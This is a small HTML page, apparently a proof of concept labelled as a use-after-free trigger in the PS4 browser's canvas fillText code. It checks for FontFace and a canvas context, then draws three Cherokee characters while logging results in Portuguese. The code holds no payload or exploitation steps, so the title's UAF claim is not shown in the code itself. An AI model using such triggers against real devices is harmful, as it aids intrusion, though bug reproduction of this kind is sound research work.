<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - PS4 fillText / drawTextInternal UAF</title>
</head>
<body>
<script>
    console.log("FontFace:", typeof FontFace);
console.log("document.fonts:", !!document.fonts);

const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");

console.log("Canvas 2D:", !!ctx);

if (ctx) {
    ctx.font = "10px sans-serif";

    try {
        ctx.fillText("\u13A0\u13A2\u13A4", 10, 10);
        console.log("fillText executado");
    } catch (error) {
        console.log("Erro:", String(error));
    }
}
</script>
</body>
</html>
